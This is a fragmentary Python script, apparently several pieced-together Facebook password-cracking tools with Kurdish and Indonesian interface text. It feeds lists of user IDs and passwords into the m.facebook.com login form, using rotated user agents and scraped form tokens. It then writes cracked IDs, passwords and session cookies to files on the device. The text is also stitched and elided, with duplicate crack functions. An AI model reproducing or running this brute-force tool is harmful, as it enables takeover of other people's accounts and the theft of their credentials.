	for user in uid:
	    try:
	       head = (
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'{H}Tkaya Kamek Chaware Bka Bo Crackrdn')
	...
	print('╰───────────────────────────────╯')
	print('')
	print(' Datawet Dubara Krack Dastpe Bkaitawa? ( Y/t ) ? ')
	woi = input('Halbzhera : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \x1b[1;37m[\x1b[1;32mRUSSI\x1b[1;32m] : {loop}×{len(id)} \x1b[1;32m[{ok}] \x1b[1;31m[{cp}]\x1b[1;37m \x1b[1;34m{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('/sdcard/𝑹𝑨𝑾𝑨-𝑹𝑼𝑺𝑺𝑰-𝑪𝑷.txt','a').write(idf+' | '+pw+'\n')
				...
				print(f'\r\x1b[1;32m \n⚔═══════════════════════RUSSI-OK★════════════════════════⚔\n\x1b[1;32m|└──𝑼𝑺𝑬𝑹-𝑰𝑫-🔎: {idf}\n|└──𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫🔐: {pw}\n|└──𝑪𝑶𝑶𝑲𝑰𝑬𝑺 {kuki}')
				(f'\r\x1b[1;32m----------------------------------------------------------')
				open('/sdcard/RUSSI-𝐎𝐊.txt','a').write(idf+' | '+pw+'\n')
				cek_SURCHY(kuki)
				break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}\x1b[33m[\x1b[32m\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m]{P} \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32mOK/\x1b[36mCP\x1b[33m] \x1b[33m[\x1b[32m{ok}/\x1b[36m{cp}\x1b[33m] \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
...
def crack(idf, pwv):
    ...
    fff = '%'
    print('\r╰───[MR_BEMNAT✔]-[%s%s/%s]-[OK:%s]-[CP:%s]-[%s%s]%s✓' %
          (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                               "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document", "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br", "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            ...
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(
                p)).group(1), "uid": idf, "flow": "login_no_pin", "pass": pw, "next": "https://developers.facebook.com/tools/debug/accesstoken/"}
            ses.headers.update({"Host": 'm.facebook.com', "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "origin": "https://m.facebook.com", "content-type": "application/x-www-form-urlencoded", "user-agent": ua,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r[{b}CP-BEMNAT✖{x}]{b} {b}{idf} | {pw}')
                ...
                print(f'\r{x}BEMNAT_OK✔ {H}{idf} | {pw}')
